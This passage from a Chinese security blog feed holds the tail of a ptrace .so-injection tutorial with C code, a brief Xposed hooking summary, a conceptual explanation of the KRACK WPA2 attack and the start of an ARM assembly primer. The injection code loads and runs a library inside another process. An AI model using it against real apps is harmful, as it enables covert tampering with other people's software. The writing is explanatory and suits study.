class="string">"dlopen"</span>, dlopen_addr, parameters, <span class="number">2</span>, &amp;regs) == <span class="number">-1</span>)  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到shellcode的句柄，找到shellcode中目标方法的偏移地址，执行dlsym加载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * sohandle = ptrace_retval(&amp;regs); </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_NAME_ADDR_OFFSET       0x100    </span></span><br><span class="line">    ptrace_writedata(target_pid, map_base + FUNCTION_NAME_ADDR_OFFSET, function_name, <span class="built_in">strlen</span>(function_name) + <span class="number">1</span>);    </span><br><span class="line">    parameters[<span class="number">0</span>] = sohandle;       </span><br><span class="line">    parameters[<span class="number">1</span>] = map_base + FUNCTION_NAME_ADDR_OFFSET;     </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"dlsym"</span>, dlsym_addr, parameters, <span class="number">2</span>, &amp;regs) == <span class="number">-1</span>)    </span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * hook_entry_addr = ptrace_retval(&amp;regs);    </span><br><span class="line">    DEBUG_PRINT(<span class="string">"hook_entry_addr = %p\n"</span>, hook_entry_addr);    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_PARAM_ADDR_OFFSET      0x200    </span></span><br><span class="line">    ptrace_writedata(target_pid, map_base + FUNCTION_PARAM_ADDR_OFFSET, param, <span class="built_in">strlen</span>(param) + <span class="number">1</span>);    </span><br><span class="line">    parameters[<span class="number">0</span>] = map_base + FUNCTION_PARAM_ADDR_OFFSET;      </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"hook_entry"</span>, hook_entry_addr, parameters, <span class="number">1</span>, &amp;regs) == <span class="number">-1</span>)    </span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br></pre></td></tr></table></figure><h1 id="7、恢复原so的状态，detach"><a href="#7、恢复原so的状态，detach" class="headerlink" title="7、恢复原so的状态，detach"></a>7、恢复原so的状态，detach</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Press enter to dlclose and detach\n"</span>);    </span><br><span class="line">getchar();    </span><br><span class="line">parameters[<span class="number">0</span>] = sohandle;       </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"dlclose"</span>, dlclose, parameters, <span class="number">1</span>, &amp;regs) == <span class="number">-1</span>)    </span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/* restore */</span>    </span><br><span class="line">ptrace_setregs(target_pid, &amp;original_regs);    </span><br><span class="line">ptrace_detach(target_pid);    </span><br><span class="line">ret = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_detach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_detach"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结，撒花</p><hr><p><strong>参考链接：</strong></p><p><a href="https://blog.csdn.net/ginray/article/details/60628251" target="_blank" rel="noopener">Ptrace 详解:https://blog.csdn.net/ginray/article/details/60628251</a></p><p><a href="https://blog.csdn.net/u012417380/article/details/60470075" target="_blank" rel="noopener">Linux Ptrace 详解: https://blog.csdn.net/u012417380/article/details/60470075</a></p><p>本文代码来自网络，地址没找到了，注释自己写的</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;so注入的主要思路是：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;找到目标进程&lt;/li&gt;
&lt;li&gt;使用ptrace跟踪目标进程，保存目标进程的状态&lt;/li&gt;
&lt;li&gt;获得mmap、dlopen、dlsym等库函数在目标进程中的偏移地址&lt;/li&gt;
&lt;li&gt;调用mmap在目标进程内部申请一段内存空间&lt;/li&gt;
&lt;li&gt;将我们的ShellCode写入到刚才申请的内存空间中&lt;/li&gt;
&lt;li&gt;dlopen打开Shellcode，dlsym调用Shellcode库的函数&lt;/li&gt;
&lt;li&gt;恢复原so状态，detach&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Xposed</title>
    <link href="http://imlzq.com/2018/01/08/Xposed/"/>
    <id>http://imlzq.com/2018/01/08/Xposed/</id>
    <published>2018-01-07T16:00:00.000Z</published>
    <updated>2018-04-13T08:41:45.180Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Xposed的表现形式：</strong></p><p>可以拦截任意应用的任意方法实现，将它替换为自设的功能代码。</p><p><strong>主要逻辑：</strong></p><ul><li>通过包名匹配查看是否有需要hook的模块。如果有，修改它的java方法为本地方法（通过修改accessFlag实现）</li><li>当目标方法被调用时，由xposed方法的本地方法调度逻辑分发，回调java层的方法，一般就是各个hook模块，从而实现使用自行实现的方法替换原方法。</li></ul><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Xposed的表现形式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以拦截任意应用的任意方法实现，将它替换为自设的功能代码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要逻辑：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过包名匹配查看是否有需要hook的模块。如果有，修改它的java方法为本地方法（通过修改accessFlag实现）&lt;/li&gt;
&lt;li&gt;当目标方法被调用时，由xposed方法的本地方法调度逻辑分发，回调java层的方法，一般就是各个hook模块，从而实现使用自行实现的方法替换原方法。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>802.11协议簇及KRACK攻击</title>
    <link href="http://imlzq.com/2017/11/07/802.11%E5%8D%8F%E8%AE%AE%E7%B0%87%E5%8F%8AKRACK%E6%94%BB%E5%87%BB/"/>
    <id>http://imlzq.com/2017/11/07/802.11协议簇及KRACK攻击/</id>
    <published>2017-11-07T14:00:00.000Z</published>
    <updated>2018-04-06T16:01:19.316Z</updated>
    
    <content type="html"><![CDATA[<p>最近暴露的KRACK攻击可以理解为钻了协议的空子，故本文就对其内部原理及实现做大致的剖析。因802.11协议簇所涉极广，暂做部分解析。详情可参考：<a href="https://zhuanlan.zhihu.com/dot11" target="_blank" rel="noopener">知乎：无线技术大讲堂</a>， <a href="https://en.wikipedia.org/wiki/IEEE_802.11" target="_blank" rel="noopener">维基百科</a></p><p>顺便学习一下wifi相关协议</p><a id="more"></a>    <h1 id="802-11协议簇"><a href="#802-11协议簇" class="headerlink" title="802.11协议簇"></a>802.11协议簇</h1><blockquote><p>无线局域网络(Wireless local network)是一种数据传输的系统，采用分布式无线电广播ISM (Industrial, Scientific, Medical) 频段将一个区域里面(如学校，家庭)的两个或者多个支持无线协议的设备连接起来的系统。进行无线射频传输的协议有多种，但是目前无线局域网络最为广泛使用的标准是IEEE 802.11协议标准</p></blockquote><p>802.11协议在1997年提出，之后的版本均在其上做修改及完善。<br>修改内容包括：</p><ul><li>IEEE 802.11，1997年，原始标准（2Mbit/s，工作在2.4GHz）。</li><li>IEEE802.11a，1999年，物理层补充（54Mbit/s，工作在5GHz）。</li><li>IEEE 802.11b，1999年，物理层补充（11Mbit/s工作在2.4GHz）。</li><li>IEEE 802.11c，符合802.1D的媒体接入控制层桥接（MAC Layer Bridging）。</li><li>IEEE 802.11d，根据各国无线电规定做的调整。</li><li>IEEE802.11e，对服务质量（Quality of Service,QoS）的支持。</li><li>IEEE 802.11f，基站的互连性（IAPP,Inter-Access Point Protocol），2006年2月被IEEE批准撤销。</li><li>IEEE802.11g，2003年，物理层补充（54Mbit/s，工作在2.4GHz）。</li><li>IEEE802.11h，2004年，无线覆盖半径的调整，室内（indoor）和室外（outdoor）信道（5GHz频段）。</li><li>IEEE802.11i，2004年，无线网络的安全方面的补充。</li><li>IEEE802.11j，2004年，根据日本规定做的升级。</li><li>IEEE 802.11l，预留及准备不使用。</li><li>IEEE 802.11m，维护标准；互斥及极限。</li><li>IEEE 802.11n，2009年9月通过正式标准，WLAN的传输速率由802.11a及802.11g提供的54Mbps、108Mbps，提高到350Mbps甚至到475Mbps。</li><li>IEEE 802.11p,2010年，这个通讯协定主要用在车用电子的无线通讯上。它设定上是从IEEE 802.11来扩充延伸，来符合智慧型运输系统（Intelligent Transportation Systems，ITS）的相关应用。应用的层面包括高速率的车辆之间以及车辆与5.9千兆赫（5.85-5.925千兆赫）波段的标准ITS路边基础设施之间的资料数据交换。</li><li>IEEE 802.11k，2008年，该协议规范规定了无线局域网络频谱测量规范。该规范的制订体现了无线局域网络对频谱资源智能化使用的需求。</li><li>IEEE 802.11r，2008年，快速基础服务转移，主要是用来解决客户端在不同无线网络AP间切换时的延迟问题。</li><li>IEEE802.11s,2007年9月.拓扑发现、路径选择与转发、信道定位、安全、流量管理和网络管理。网状网络带来一些新的术语。</li><li>IEEE 802.11w，2009年，针对802.11管理帧的保护。</li><li>IEEE 802.11x，包括802.11a/b/g等三个标准。[1] </li><li>IEEE 802.11y，2008年，针对美国3650–3700 MHz 的规定。</li><li>IEEE 802.11ac，802.11n之后的版本。工作在5G频段，理论上可以提供高达每秒1Gbit的数据传输能力。</li></ul><h2 id="WIFI、WLAN、802-11"><a href="#WIFI、WLAN、802-11" class="headerlink" title="WIFI、WLAN、802.11"></a>WIFI、WLAN、802.11</h2><ul><li>WLAN（Wireless Local area network）是个概念，网络技术术语。使用ISM(Industrial、Scientific、Medical)无线电广播频段通信</li><li>802.11是官方制定的标准</li><li>WIFI(WirelessFidelity，无线保真)是任何一个基于802.11标准的WLAN产品(“wireless local area network (WLAN) products that are based on the IEEE 802.11 standard.”)，目的是改善基于IEEE802.11标准的无线网路产品之间的互通性。说白了也就是wifi=采用802.11技术的WLAN</li></ul><h2 id="IEEE-802-11i"><a href="#IEEE-802-11i" class="headerlink" title="IEEE 802.11i"></a>IEEE 802.11i</h2><p>无线安全标准，WPA是其子集。<br>定义了RSN（Robust Security Network）概念从而增强WLAN的数据加密和认证性能，并且针对WEP加密机制的各种缺陷做了多方面的改进。<br>IEEE 802.11主要的标准范畴分为媒介层(MAC)与物理层(PHY)，套用过来，前者就是OSI的数据链路层中的媒体访问控制子层，后者直接就对应OSI的物理层。<br>IEEE 802.11a/b/g，主要是以PHY层的不同作为区分，所以它们的区别直接表现在工作频段及数据传输率、最大传输距离这些指标上。而工作在媒介层的标准——IEEE 802.11e/f/i则被整个IEEE 802.11族所共用。</p><blockquote><p>IEEE 802.11i采用802.1x接入控制，实现无线局域网的认证与密钥管理，并通过EAP-Key的四向握手过程与组密钥握手过程，创建、更新加密密钥，实现802.11i中定义的鲁棒安全网络（Robust Security Network，RSN）的要求。</p></blockquote><h3 id="加密机制（待详细拓展）"><a href="#加密机制（待详细拓展）" class="headerlink" title="加密机制（待详细拓展）"></a>加密机制（待详细拓展）</h3><p><strong>TKIP（Temporal Key Integrity Protocol，时间密钥完整性协议）：</strong><br>采用WEP机制里的RC4作为核心加密算法，可以通过在现有的设备上升级固件和驱动程序的方法达到提高WLAN安全的目的。</p><p><strong>CCMP（Counter-Mode/CBC-MAC Protocol）：</strong><br>基于AES（Advanced Encryption Standard）加密算法和CCM（Counter-Mode/CBC-MAC）认证方式，使得WLAN的安全程度大大提高，是实现RSN的强制性要求。<br>CCMP主要由两个算法组成，分别是CTR mode以及CBC-MAC mode。</p><p>CTR mode为加密算法，CBC-MAC用于讯息完整性的运算。<br>CTR：Advanced Encryption Standard (AES) in Counter Mode。<br>CBC-MAC：Cipher Block Chaining Message Authentication Code。</p><p><strong>WRAP（Wireless Robust Authenticated Protocol）：</strong><br>基于AES加密算法和OCB（Offset Codebook），是一种可选的加密机制。</p><h3 id="The-4-Way-Handshake：四向握手"><a href="#The-4-Way-Handshake：四向握手" class="headerlink" title="The 4-Way Handshake：四向握手"></a>The 4-Way Handshake：四向握手</h3><p>在四向握手之前会有一些无线发现的过程。4次握手之后是组密钥协商过程。而握手的目的则是为了身份认证（其实也就是使用伪随机函数来创建和分发动态加密密钥的过程）。<br>以下的AP为Wireless access point（无线接入点），STA即连接无线网络的终端设备。</p><p><strong>有几个关键名词，先对他们进行基本介绍</strong></p><h4 id="PSK-Pre-Shared-Key-预共享密钥"><a href="#PSK-Pre-Shared-Key-预共享密钥" class="headerlink" title="PSK(Pre-Shared Key, 预共享密钥)"></a>PSK(Pre-Shared Key, 预共享密钥)</h4><p>口令(passphrase)经PSK映射转换算法处理后得到的结果</p><h4 id="PMK-Pairwise-Master-Key-成对主密钥"><a href="#PMK-Pairwise-Master-Key-成对主密钥" class="headerlink" title="PMK(Pairwise Master Key, 成对主密钥)"></a>PMK(Pairwise Master Key, 成对主密钥)</h4><p>成对主密钥。最高等级的密钥，由PSK生成。在WPA2中可以看做是ssid和口令的哈希值（也就是wifi的名称和密码，口令不同于密码，但可这样快速理解）</p><h4 id="PTK（The-Pairwise-Transient-Key）"><a href="#PTK（The-Pairwise-Transient-Key）" class="headerlink" title="PTK（The Pairwise Transient Key）"></a>PTK（The Pairwise Transient Key）</h4><p>成对临时密钥。最终用于加密单播数据流的加密密钥<br>采用伪随机函数PRF（pseudo-random function）来生成PTK。<br>PTK的计算方法可以看作是计算PMK、ANonce、SNonce、AP的MAC地址（AA），STA的MAC地址（SPA）这一个5元数组的哈希值。<br>PTK = PRF（PMK + ANonce + SNonce + AA + SPA）</p><h4 id="GTK（The-Group-Temporal-Key）"><a href="#GTK（The-Group-Temporal-Key）" class="headerlink" title="GTK（The Group Temporal Key）"></a>GTK（The Group Temporal Key）</h4><p>组临时密钥。用于加密广播和组播数据流的加密密钥</p><h4 id="MIC"><a href="#MIC" class="headerlink" title="MIC"></a>MIC</h4><p>消息完整性编码。它是PTK的前16个字节，如果双方的MIC一致，就说明PMK生成的一致，也就说明双方拥有的口令一致（也就是密码对了），那么AP就能确认STA的身份。</p><blockquote><p>The actual messages exchanged during the handshake are depicted in the figure and explained below (all messages are sent as EAPOL-Key frames):</p><ol><li>The AP sends a nonce-value to the STA (ANonce). The client now has all the attributes to construct the PTK.</li><li>The STA sends its own nonce-value (SNonce) to the AP together with a Message Integrity Code (MIC), including authentication, which is really a Message Authentication and Integrity Code (MAIC).</li><li>The AP constructs and sends the GTK and a sequence number together with another MIC. This sequence number will be used in the next multicast or broadcast frame, so that the receiving STA can perform basic replay detection.</li><li>The STA sends a confirmation to the AP.</li></ol></blockquote><p>在握手过程中，所有信息都以EAPOL帧发送(Extensible Authentication Protocol Over LAN，基于局域网的扩展认证协议)。</p><pre><code>1. AP（认证方）发起，发送一个ANonce到STA（终端）。ANonce作为重放保护，必须时这个PMK之前没用过的值2. STA在收到信息后结合ANonce和自行构造的SNonce构造PTK，然后发送SNonce和MIC（消息验证码）到AP。3. AP也利用（ANonce和SNonce）构造PTK，并且验证STA发过来的MIC等信息。验证成功后生成GTK并发送消息。消息包括GTK、告诉STA安装PTK和GTK、接收顺序计数器RSC（receive sequence counter， 即当前GTK的顺序号），并让STA允许检测重播的广播信息4. STA接收到AP返还的消息，验证MIC，安装密钥，返还确认信息给AP。AP在收到确认后，验证MIC，安装相同的密钥。此时，双方都安装了相同的PTK和GTK。</code></pre><p>之后通信双方就可以使用进行安全的通信了。<br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/b7487b5c93477b6632d9fb0f452e70a65e7c7d70" alt="4-way handshake"><br>图片摘自<a href="https://en.wikipedia.org/wiki/IEEE_802.11i-2004" target="_blank" rel="noopener">维基百科</a></p><p><strong>所以总结一下流程也就是：AP和STA在交换随机数的同时进行数据校验，并用这个随机数以及自身已知的一些数据构建PTK、GTK。</strong></p><h2 id="常见的WIFI类型"><a href="#常见的WIFI类型" class="headerlink" title="常见的WIFI类型"></a>常见的WIFI类型</h2><h3 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h3><p>WEP（Wired Equivalent Privacy，有线等效保密协议）是对在两台设备间无线传输的数据进行加密的方式，用以防止非法用户窃听或侵入无线网络。它使用RC4（Rivest Cipher）对分组信息进行加密，并使用 CRC-32 验证达到资料的正确性。</p><p><strong>攻击、破解</strong><br>它使用加密密钥包括收发双发预先确定的40位或者104位通用密钥、发送方为每个分组信息所确定的24位加密密钥IV(initialization vector)。但是为了当IV密钥告诉给通信对象，IV不经加密就直接嵌入到分组信息中发送出去。如果通过无限窃听，手机到包含特定IV密钥的分组信息并对其进行解析，那么连隐秘的通用密钥都可能呗计算出来</p><h3 id="WPA-WPA2"><a href="#WPA-WPA2" class="headerlink" title="WPA/WPA2"></a>WPA/WPA2</h3><p>WPA（WIFI-Protected Access），有WPA和WPA2两个标准，它是根据WEP中找到的几个严重漏洞产生的.WPA实现了IEEE 802.11i标准的大部分，是在802.11i完备之前替代WEP的过渡方案。WPA2具备完整的标准体系，但其不能被应用在某些老旧型号的网卡上。</p><h1 id="KRACK（Key-Reinstallation-Attack）"><a href="#KRACK（Key-Reinstallation-Attack）" class="headerlink" title="KRACK（Key Reinstallation Attack）"></a>KRACK（Key Reinstallation Attack）</h1><blockquote><p>KRACK (Key Reinstallation Attack) is a severe replay attack (a type of exploitable flaw) on the Wi-Fi Protected Access protocol that secures Wi-Fi connections. It was discovered in 2016 by the Belgian researchers Mathy Vanhoef and Frank Piessens of the University of Leuven.Vanhoef’s research group published details of the attack in October 2017.By repeatedly resetting the nonce transmitted in the third step of the WPA2 handshake, an attacker can gradually match encrypted packets seen before and learn the full keychain used to encrypt the traffic.<br>The weakness is in the Wi-Fi standard itself, and not in individual products or implementations. Therefore, any correct implementation of WPA2 is likely to be vulnerable. The vulnerability affects all major software platforms, including Microsoft Windows, macOS, iOS, Android, Windows Phone and Linux.<br>The widely used open-source implementation wpa_supplicant, utilized by Linux, Android, and OpenBSD, is especially susceptible as it can be manipulated to install an all-zeros encryption key, effectively nullifying WPA2 protection in a man-in-the-middle attack.<br>The attack targets the four-way handshake used to establish a nonce (a kind of “shared secret”) in the WPA2 protocol. The standard for WPA2 anticipates occasional WiFi disconnections, and allows reconnection using the same value for the third handshake (for quick reconnection and continuity). Because the standard does not require a different key to be used in this type of reconnection, which could be needed at any time, a replay attack is possible.<br>An attacker can repeatedly re-send the third handshake of another device’s communication to manipulate or reset the WPA2 encryption key. Each reset causes data to be encrypted using the same values, so blocks with the same content can be seen and matched, working backwards to identify parts of the keychain which were used to encrypt that block of data. Repeated resets gradually expose more of the keychain until eventually the whole key is known, and the attacker can read the target’s entire traffic on that connection.</p></blockquote><p><a href="https://en.wikipedia.org/wiki/KRACK" target="_blank" rel="noopener">摘自维基百科</a></p><p>KRACK在2016年被研究者发现并于2017年10月公布攻击细节。<br>小道消息：据说斯诺登2010年泄露NSA机密文档介绍的BADDECISION项目貌似就是KRACK攻击 : )</p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><blockquote><p>In this demonstration, the attacker is able to decrypt all data that the victim transmits. For an attacker this is easy to accomplish, because our key reinstallation attack is exceptionally devastating against Linux and Android 6.0 or higher. This is because Android and Linux can be tricked into (re)installing an all-zero encryption key. </p></blockquote><p>摘自<a href="https://www.krackattacks.com/" target="_blank" rel="noopener">krackattacks.com</a></p><p>攻击者可以多次重放四向握手的第三次握手，强制重装受害者已经在用的WPA密钥，即可以把原来正确真实的WPA密码用一个全零的加密密钥替换掉，之后再建立一个同名但密码全零的AP，就能使STA连接到这个钓鱼AP上，从而完全获得用户的网络数据。</p><h2 id="Tip1"><a href="#Tip1" class="headerlink" title="Tip1"></a>Tip1</h2><p>WPA2的标准中若WiFi偶尔断开连接，则允许重新使用相同的值进行第三次握手（用于建立快速的重新连接和保持连续性）进行连接。</p><h2 id="Tip2"><a href="#Tip2" class="headerlink" title="Tip2"></a>Tip2</h2><p>在四向握手的第三次完成后，STA就会认为生成的PTK是正确的，安装PTK并开始使用其派生的密钥作为CCMP的会话密钥，然后通过802.1x进行通信。</p><h2 id="Tip3"><a href="#Tip3" class="headerlink" title="Tip3"></a>Tip3</h2><p>协议规定：</p><pre><code>1. 每次生成PTK后，都要重设CCMP的计数器的值2. 处在已经安装PTK状态下的STA要处理重传的第一和第三个握手包</code></pre><h2 id="Tip4"><a href="#Tip4" class="headerlink" title="Tip4"></a>Tip4</h2><p>STA方给AP发送确认包之后并不能确认认证方是否收到了Ack，而如果AP在第三次握手完成后一直没有收到Ack确认包，则会重传第三次的握手包，同时递增其中的replay-counter值来使其有效。</p><h2 id="Tip5"><a href="#Tip5" class="headerlink" title="Tip5"></a>Tip5</h2><p>Android和Linux中的wpa_supplicant基本都存在例外，允许未完整加密的EAPOL包和未验证PTK密钥来源</p><h2 id="Tip6"><a href="#Tip6" class="headerlink" title="Tip6"></a>Tip6</h2><p>WPA加密协议采用的是stream cipher加密（即用一个伪随机密钥流逐字节去异或明文）。</p><blockquote><p>可简单理解为：ciphertext = plaintext xor AES(key, IV||counter)</p></blockquote><p>在正常的过程中，key和IV是不变的，counter值每次都递增，这也就导致每次生成的密钥都不同。<br>但在重安装过程中，counter值会被反复置为0，这也就导致每次生成的密钥都是一样的。<br>所以数据的结果也就变为了：使用同一密钥加密多组不同的明文。对于两组密文来说，相互异或就能抵消掉密钥，只剩加密后的明文。而如果其中一组明文对于攻击者而言已知，那么就可推出另一组明文的具体内容。</p><h2 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h2><p>攻击者事先在STA和AP中充当中间人，通过拦截第四次握手包让AP重传第三次握手包，这样就会导致STA重装本地密钥。重装密钥之后，就能诱使STA连接到一个钓鱼AP上了（AP连接的验证机制可以简单理解为AP名+密码，密码全零即可）</p><pre><code>1. 对于Android 6.0以上的手机来说（Linux上的wpa_supplicant版本为2.4~2.6的wifi客户端），在初始化密钥后，它们会直接将包含密钥材料的缓冲区内存清零。但程序并不知道缓冲区已经被清零，因此又会再去读取一次那块内存区域，那这个时候的密钥就一定是由全零的数据衍生来的。如Nonce为0，那么攻击者就可以直接计算出加密数据包所使用的密钥，也就能直接解析用户发送的数据了。2. 对于非Android6.0和Linux对应wpa_supplicant的wifi客户端来说，STA加密所用的密钥不可知，但如果攻击者知晓其中一组数据包的明文是什么，那么就可以推出其他数据包的明文（此过程不需要知晓加密密钥，直接异或）。但从[其他文章](https://zhuanlan.zhihu.com/p/30281357?group_id=904476874034634752)上发现，每次可推导出的明文内容有限且可能具有很大的不确定性。</code></pre><p>这个过程只能说是绕过而不能说是破解WPA2（发现者也说是bypass），因为wifi的密钥在整个流程中并没有被破解，也没有破解四向握手过程中新生成的加密密钥。</p><ul><li>Android 6.0以上和部分Linux之所以成为目标是因为它的wpa_supplicant代码实现上有问题。windows和ios因为实现不同因此不会受zero-encrypt key的攻击。</li><li>如果敏感信息进行了加密或者其他安全保护比如https，那就是安全的</li></ul><h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><ul><li>有些细节及攻击实现上因为是自己的理解，并且Paper太拖沓，跳着看的，所以一些地方可能有偏差。如果以后发现有不足或者错误的地方就再修改吧。</li><li>POC据说已经有了，研究后再完善一下</li><li>一些协议的基础细节上不是很完善，之后再补充，比如CCMP、WEP、WPA/WPA2、EAP、EAPOL</li></ul><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul><li><a href="https://en.wikipedia.org/wiki/KRACK" target="_blank" rel="noopener">维基百科：https://en.wikipedia.org/wiki/KRACK</a></li><li><a href="https://www.youtube.com/watch?v=Oh4WURZoR98" target="_blank" rel="noopener">KRACK演示视频: https://www.youtube.com/watch?v=Oh4WURZoR98</a></li><li><a href="https://papers.mathyvanhoef.com/ccs2017.pdf" target="_blank" rel="noopener">KRACK Paper: https://papers.mathyvanhoef.com/ccs2017.pdf</a></li><li><a href="https://www.krackattacks.com/" target="_blank" rel="noopener">https://www.krackattacks.com/</a></li><li><a href="https://zhuanlan.zhihu.com/p/30281357?group_id=904476874034634752" target="_blank" rel="noopener">Don’t Panic! KRACK 没你想象的那么糟</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近暴露的KRACK攻击可以理解为钻了协议的空子，故本文就对其内部原理及实现做大致的剖析。因802.11协议簇所涉极广，暂做部分解析。详情可参考：&lt;a href=&quot;https://zhuanlan.zhihu.com/dot11&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;知乎：无线技术大讲堂&lt;/a&gt;， &lt;a href=&quot;https://en.wikipedia.org/wiki/IEEE_802.11&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;维基百科&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;顺便学习一下wifi相关协议&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="蓝牙" scheme="http://imlzq.com/tags/%E8%93%9D%E7%89%99/"/>
    
  </entry>
  
  <entry>
    <title>汇编基础及个人理解</title>
    <link href="http://imlzq.com/2017/11/07/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%8F%8A%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/"/>
    <id>http://imlzq.com/2017/11/07/汇编基础及个人理解/</id>
    <published>2017-11-07T10:53:38.000Z</published>
    <updated>2018-04-11T04:42:45.431Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章主要介绍汇编、计算机组成原理等基本内容，属于基础篇。方便其他人快速查阅。<br>每一段的基础介绍都参杂一些个人理解</p><a id="more"></a>    <h1 id="基于ARM的体系结构"><a href="#基于ARM的体系结构" class="headerlink" title="基于ARM的体系结构"></a>基于ARM的体系结构</h1><h2 id="冯诺依曼体系"><a href="#冯诺依曼体系" class="headerlink" title="冯诺依曼体系"></a>冯诺依曼体系</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>冯诺依曼体系：数据和指令都存储再一个存储器中的计算机。<br>这种结构的计算机系统由中央处理器单元（CPU）和一个存储器组成。</p><p>存储器拥有数据和指令，可以根据所给的地址对它进行读写。<br>CPU有几个可以存放内部使用值的内部寄存器。<br>程序计数器器（PC）：存放指令再存储器中地址的寄存器。完成一个取指令操作后，PC = PC + 1.这里的1指的是一个单位，也就是一条指令的长度 ÷ 寻址粒度。因为X86的指令长度不一样，所以每次增加的量会变化。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>CPU先从存储器中取出指令，然后对指令进行译码，最后执行。PC并不直接决定机器下一步要做什么，它只是间接地指向了存储器中的指令。<br><strong>因此，只要改变了存储器中的指令，就能改变CPU所做的事情。</strong></p><p>冯诺依曼体系认为：程序只是一种（特殊）的数据，它可以像数据一样被处理，因此可以和数据一起被存储在同一个存储器中。数据总线和地址总线共用。</p><h2 id="哈佛体系"><a href="#哈佛体系" class="headerlink" title="哈佛体系"></a>哈佛体系</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>哈佛体系为数据和程序分别提供了独立的存储器（即将冯诺依曼体系里的数据和程序指令拆开）。</p><h3 id="流程-1"><a href="#流程-1" class="headerlink" 